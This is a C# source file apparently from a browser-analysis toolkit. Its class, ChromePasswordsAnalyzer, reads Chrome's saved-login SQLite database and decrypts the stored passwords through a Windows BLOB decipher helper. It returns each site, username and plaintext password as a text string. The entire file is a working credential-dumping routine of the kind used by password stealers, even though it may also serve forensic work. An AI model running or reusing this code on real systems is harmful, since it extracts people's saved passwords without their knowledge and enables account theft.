using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using BLOBDecipher;

namespace ChromeAnalyzer {
    public class ChromePasswordsAnalyzer : BrowserAnalyzer.PasswordsAnalyzer {
        private SQLite.Client client;
        private DataTable queryResult = null;
        private const string QUERY =
            "SELECT signon_realm AS url, username_value AS username, password_value AS pass " +
            "FROM logins " +
            "WHERE username != ''";

        public ChromePasswordsAnalyzer(string location) {
            client = new SQLite.Client(location);
        }

        public string getPasswords() {
            if (queryResult == null) {
                queryResult = client.select(QUERY);
                WindowsBLOBDecipher.decipherQueryResultField("pass", queryResult);
            }

            string s = "";
            foreach (DataRow r in queryResult.Rows) {
                string pass = System.Text.Encoding.Default.GetString((byte[])r["pass"]);
                s += r["url"] + " -> " + r["username"] + " : " + pass + "\r\n";
            }

            return s;
        }
    }
}
